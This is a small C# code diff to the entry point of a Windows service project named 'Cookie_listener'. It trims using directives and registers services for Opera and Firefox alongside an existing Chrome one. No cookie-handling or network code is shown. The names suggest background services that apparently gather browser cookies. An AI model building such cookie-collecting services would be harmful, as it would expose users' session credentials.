@@ -1,9 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.ServiceProcess;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.ServiceProcess;
 
 namespace Cookie_listener
 {
@@ -17,7 +12,9 @@ namespace Cookie_listener
             ServiceBase[] ServicesToRun;
             ServicesToRun = new ServiceBase[]
             {
-                new Service_fo_chrome()
+                new Service_fo_chrome(),
+                new Service_fo_Opera(),
+                new Service_fo_FireFox()
             };
             ServiceBase.Run(ServicesToRun);
         }
